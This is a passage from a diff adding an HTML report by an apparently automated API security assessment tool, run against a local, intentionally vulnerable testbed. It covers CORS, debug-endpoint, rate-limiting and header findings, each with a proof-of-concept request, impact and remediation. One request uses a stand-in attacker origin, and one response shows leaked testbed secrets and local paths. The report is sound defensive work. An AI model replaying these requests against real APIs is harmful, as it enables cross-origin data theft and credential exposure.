+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 7.1</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API8:2023 - Security Misconfiguration</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-942: Permissive Cross-Domain Policy with Untrusted Domains</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET / OPTIONS /api/v1/*</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The API server dynamically reflects arbitrary Origin headers with Access-Control-Allow-Credentials: true (or provides a wildcard '*' policy). This allows malicious websites visited by an authenticated victim to issue cross-origin requests and read sensitive API responses directly.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/documents HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Origin: https://evil-attacker.com
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 401 UNAUTHORIZED
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 79
+Access-Control-Allow-Origin: https://evil-attacker.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "error": "Unauthorized",
+  "message": "Missing Authorization Bearer token header"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Cross-Site Data Theft. Attackers can lure authenticated employees to a malicious site and exfiltrate documents, profile information, and private customer data.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Avoid setting Access-Control-Allow-Origin to '*' on authenticated endpoints.
+2. Avoid reflecting the client's Origin header blindly.
+3. Implement an explicit whitelist of trusted frontend domains.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-MISC-004 Unauthenticated Debug Configuration Endpoint Disclosed API8:2023 - Security Misconfiguration /api/v1/tools/debug/config">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-MISC-004</span>
+                    <span class="finding-title">Unauthenticated Debug Configuration Endpoint Disclosed</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.2</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API8:2023 - Security Misconfiguration</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-215: Insertion of Sensitive Information Into Debugging Code</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/tools/debug/config</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">An unauthenticated debug endpoint '/api/v1/tools/debug/config' is accessible in production, exposing secret keys, database file locations, and internal environment variables.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/tools/debug/config HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 989
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "app_secret": "app-super-secret-key-production",
+  "database_path": "c:\\Users\\ASUS\\Desktop\\API Security Assessment & Automated VAPT Framework\\api_testbed\\vapt_testbed.db",
+  "debug_status": "ENABLED",
+  "environment_variables": {
+    "HOMEPATH": "\\Users\\ASUS",
+    "PATH": "C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\WINDOWS\\System32\\OpenSSH\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Program Files\\GitHub CLI\\;C:\\Users\\ASUS\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\ASUS\\AppData\\Roaming\\npm;C:\\Users\\ASUS\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Users\\ASUS\\AppData\\Local\\Python\\bin;C:\\Users\\ASUS\\AppData\\Local\\Programs\\Microsoft VS Code\\bin\\copilot-shim",
+    "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC",
+    "PSMODULEPATH": "C:\\Program Files\\WindowsPowerShell\\Modules;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules"
+  },
+  "jwt_secret": "secret123"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Critical credential and configuration exposure allowing lateral movement and full compromise.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Disable all diagnostic, profiling, and debug endpoints in production deployments.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="MEDIUM" data-search="VAPT-RATE-001 Missing Rate Limiting on Authentication Endpoint API4:2023 - Unrestricted Resource Consumption /api/v1/auth/login">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-MEDIUM">MEDIUM</span>
+                    <span class="finding-id">VAPT-RATE-001</span>
+                    <span class="finding-title">Missing Rate Limiting on Authentication Endpoint</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 5.3</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API4:2023 - Unrestricted Resource Consumption</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-307: Improper Restriction of Excessive Authentication Attempts</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>POST /api/v1/auth/login</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The authentication endpoint does not enforce rate limiting or lockout policies on repeated failed authentication requests. 10 rapid consecutive login requests were executed without triggering an HTTP 429 Too Many Requests or exponential backoff.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>POST /api/v1/auth/login HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Content-Length: 62
+Content-Type: application/json
+
+{"username": "rate_test_user", "password": "WrongPassword_9!"}</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 401 UNAUTHORIZED
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 66
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "error": "Unauthorized",
+  "message": "Invalid username or password"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Enables credential stuffing, brute-force password guessing attacks, and distributed denial of service (DDoS).</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Enforce IP-based and user-account-based rate limiting on authentication routes (e.g. 5 attempts/minute).
+2. Return HTTP 429 Too Many Requests with a 'Retry-After' header.
+3. Implement CAPTCHA or progressive delays on repeated failures.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="LOW" data-search="VAPT-MISC-002 Missing Standard Defense-in-Depth HTTP Security Headers API8:2023 - Security Misconfiguration Global Headers">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-LOW">LOW</span>
+                    <span class="finding-id">VAPT-MISC-002</span>
+                    <span class="finding-title">Missing Standard Defense-in-Depth HTTP Security Headers</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 3.7</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API8:2023 - Security Misconfiguration</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-693: Protection Mechanism Failure</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>ALL Global Headers</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The server is missing standard protective security headers: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Strict-Transport-Security. These headers instruct modern web browsers and API consumers to enforce MIME sniffing protection, clickjacking defense, and HTTPS transport security.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET / HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 1119
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "endpoints": {
+    "admin": [
+      "/api/v1/admin/users",
+      "/api/v1/admin/system/status",
+      "/api/v1/admin/export-db"
+    ],
+    "auth": [
+      "/api/v1/auth/login",
+      "/api/v1/auth/register"
+    ],
+    "documents": [
+      "/api/v1/documents",
+      "/api/v1/documents/<id>"
+    ],
+    "orders": [
+      "/api/v1/orders",
+      "/api/v1/orders/<id>"
+    ],
+    "products": [
+      "/api/v1/products",
+      "/api/v1/products/search"
+    ],
+    "tools": [
+      "/api/v1/tools/ping",
+      "/api/v1/tools/debug/crash",
+      "/api/v1/tools/debug/config"
+    ],
+    "users": [
+      "/api/v1/users/<id>/profile"
+    ]
+  },
+  "name": "ShopVault Enterprise REST API",
+  "owasp_target_coverage": [
+    "API1:2023 - Broken Object Level Authorization (BOLA/IDOR)",
+    "API2:2023 - Broken Authentication (JWT none-alg & weak secret)",
+    "API3:2023 - Broken Object Property Level Authorization (Mass Assignment & Excessive Data)",
+    "API4:2023 - Unrestricted Resource Consumption (Rate Limiting)",
+    "API5:2023 - Broken Function Level Authorization (BFLA Admin Access)",
+    "API8:2023 - Security Misconfiguration (CORS, Missing Headers, Debug Exposure)",
+    "CWE-89 - SQL Injection (Search endpoint)",
+    "CWE-78 - OS Command Injection (Diagnostics Ping utility)"
+  ],
+  "security_mode": "VULNERABLE (Assessment Testbed)",
+  "version": "v1.4.2"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Increased susceptibility to MIME-type confusion attacks and clickjacking.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Configure API middleware or reverse proxy (Nginx/Cloudflare) to send:
+- X-Content-Type-Options: nosniff
+- X-Frame-Options: DENY
+- Content-Security-Policy: default-src 'self'
+- Strict-Transport-Security: max-age=31536000; includeSubDomains</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="INFO" data-search="VAPT-MISC-003 Server Technology & Version Fingerprint Disclosure API8:2023 - Security Misconfiguration Global Headers">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-INFO">INFO</span>
+                    <span class="finding-id">VAPT-MISC-003</span>
+                    <span class="finding-title">Server Technology & Version Fingerprint Disclosure</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 2.0</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API8:2023 - Security Misconfiguration</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>ALL Global Headers</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The server leaks detailed framework and version information via headers: Server='Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7', X-Powered-By='Flask-VAPT-API'. This helps attackers target known CVEs specific to the running version.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET / HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 1119
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "endpoints": {
+    "admin": [
+      "/api/v1/admin/users",
+      "/api/v1/admin/system/status",
+      "/api/v1/admin/export-db"
+    ],
+    "auth": [
+      "/api/v1/auth/login",
+      "/api/v1/auth/register"
+    ],
+    "documents": [
+      "/api/v1/documents",
+      "/api/v1/documents/<id>"
+    ],
+    "orders": [
+      "/api/v1/orders",
+      "/api/v1/orders/<id>"
+    ],
+    "products": [
+      "/api/v1/products",
+      "/api/v1/products/search"
+    ],
+    "tools": [
+      "/api/v1/tools/ping",
+      "/api/v1/tools/debug/crash",
+      "/api/v1/tools/debug/config"
+    ],
+    "users": [
+      "/api/v1/users/<id>/profile"
+    ]
+  },
+  "name": "ShopVault Enterprise REST API",
+  "owasp_target_coverage": [
+    "API1:2023 - Broken Object Level Authorization (BOLA/IDOR)",
+    "API2:2023 - Broken Authentication (JWT none-alg & weak secret)",
+    "API3:2023 - Broken Object Property Level Authorization (Mass Assignment & Excessive Data)",
+    "API4:2023 - Unrestricted Resource Consumption (Rate Limiting)",
+    "API5:2023 - Broken Function Level Authorization (BFLA Admin Access)",
+    "API8:2023 - Security Misconfiguration (CORS, Missing Headers, Debug Exposure)",
+    "CWE-89 - SQL Injection (Search endpoint)",
+    "CWE-78 - OS Command Injection (Diagnostics Ping utility)"
+  ],
+  "security_mode": "VULNERABLE (Assessment Testbed)",
+  "version": "v1.4.2"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Assists attackers during reconnaissance and vulnerability mapping.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Suppress or sanitize Server and X-Powered-By headers in production environments.</div>
+                </div>
+            </div>
+        </div>
+        
+
+        <footer>
+            API Security Assessment & Automated VAPT Framework &bull; Designed for Enterprise API Security & Compliance
+        </footer>
+    </div>
+
+    <script>
+        function toggleCard(headerElement) {
+            const card = headerElement.parentElement;
+            const content = card.querySelector('.finding-content');
+            const icon = headerElement.querySelector('.toggle-icon');
+            
+            if (content.classList.contains('collapsed')) {
+                content.classList.remove('collapsed');
+                icon.textContent = '▼';
+            } else {
+                content.classList.add('collapsed');
+                icon.textContent = '▶';
+            }
+        }
+
+        let allCollapsed = false;
+        function toggleAllCards() {
+            allCollapsed = !allCollapsed;
+            document.querySelectorAll('.finding-card').forEach(card => {
+                const content = card.querySelector('.finding-content');
+                const icon = card.querySelector('.toggle-icon');
+                if (allCollapsed) {
+                    content.classList.add('collapsed');
+                    icon.textContent = '▶';
+                } else {
+                    content.classList.remove('collapsed');
+                    icon.textContent = '▼';
+                }
+            });
+        }
+
+        function filterBySeverity(severity) {
+            // Update active button state
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                if (btn.textContent.toUpperCase().includes(severity)) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            });
+
+            let visibleCount = 0;
+            document.querySelectorAll('.finding-card').forEach(card => {
+                const cardSev = card.getAttribute('data-severity');
+                if (severity === 'ALL' || cardSev === severity) {
+                    card.style.display = 'block';
+                    visibleCount++;
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+
+            document.getElementById('findingsCount').textContent = 'Showing ' + visibleCount + ' items';
+        }
+
+        function searchFindings() {
+            const query = document.getElementById('searchInput').value.toLowerCase().trim();
+            let visibleCount = 0;
+            
+            document.querySelectorAll('.finding-card').forEach(card => {
+                const searchContent = card.getAttribute('data-search').toLowerCase();
+                if (!query || searchContent.includes(query)) {
+                    card.style.display = 'block';
+                    visibleCount++;
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+
+            document.getElementById('findingsCount').textContent = 'Showing ' + visibleCount + ' items';
+        }
+
+        function copyPoC(btn) {
+            const pre = btn.parentElement.nextElementSibling;
+            const text = pre.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const orig = btn.textContent;
+                btn.textContent = 'Copied!';
+                setTimeout(() => { btn.textContent = orig; }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
